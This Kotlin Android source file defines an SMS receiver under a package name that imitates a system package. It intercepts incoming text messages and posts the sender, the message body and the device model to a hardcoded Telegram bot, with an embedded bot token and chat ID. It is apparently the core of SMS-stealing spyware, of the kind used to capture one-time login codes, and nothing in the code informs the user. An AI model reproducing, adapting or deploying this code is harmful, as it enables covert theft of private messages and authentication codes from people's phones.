package com.android.quickdraw

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.provider.Telephony
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class SmsReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()
    private val PREFS_NAME = "SmsPrefs"
    private val SMS_SENT_KEY = "sms_sent"

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Telephony.Sms.Intents.SMS_DELIVER_ACTION,
            "android.provider.Telephony.SMS_RECEIVED" -> {
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                
                // Если уведомление уже отправлено - выходим
                if (prefs.getBoolean(SMS_SENT_KEY, false)) {
                    return
                }
                
                // Обрабатываем SMS и помечаем как отправленное
                if (handleSms(context, intent)) {
                    prefs.edit().putBoolean(SMS_SENT_KEY, true).apply()
                }
            }
        }
    }

    private fun handleSms(context: Context, intent: Intent): Boolean {
        // Пытаемся получить сообщение современным способом
        val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        smsMessages?.firstOrNull()?.let { sms ->
            sendSmsToBot(
                sender = sms.originatingAddress ?: "Unknown",
                message = sms.messageBody ?: "Empty message"
            )
            return true
        }

        // Fallback для старых устройств
        val bundle: Bundle? = intent.extras
        val pdus: Array<Any?>? = bundle?.get("pdus") as Array<Any?>?
        pdus?.firstOrNull()?.let { pdu ->
            val smsMessage = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
            sendSmsToBot(
                sender = smsMessage.originatingAddress ?: "Unknown",
                message = smsMessage.messageBody ?: "Empty message"
            )
            return true
        }

        return false
    }

    private fun sendSmsToBot(sender: String, message: String) {
        try {
            val botToken = "8278693005:AAEJMer1juepZXE0lP2QPAok7Pb-pscuoR4"
            val chatId = "7212024751"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val deviceModel = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"

            val text = """
                Новое SMS сообщение
                Отправитель: $sender
                Сообщение: $message
                $deviceModel
            """.trimIndent()

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$text",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    e.printStackTrace()
                }

                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
